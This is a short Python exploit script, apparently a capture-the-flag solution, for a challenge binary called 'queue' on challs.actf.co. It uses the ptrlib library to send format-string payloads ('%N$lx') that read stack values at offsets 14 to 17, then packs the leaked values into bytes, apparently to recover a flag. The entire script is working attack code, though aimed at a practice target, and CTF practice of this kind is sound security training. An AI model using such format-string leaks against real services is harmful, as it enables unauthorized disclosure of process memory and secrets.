#!/usr/bin/env python
import ptrlib as ptr
import sys

elf = ptr.ELF("./queue")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("challs.actf.co", 31322)
    else:
        return ptr.Process(elf.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    dump = b""
    for i in range(13, 17):
        io = connect()
        payload = f"#%{i + 1}$lx#".encode()
        io.sendline(payload)
        io.recvuntil(b"#")
        data = int(io.recvuntil(b"#").strip(b"#"), 16)
        dump += ptr.p64(data)
        io.close()
    print(dump)


if __name__ == "__main__":
    main()
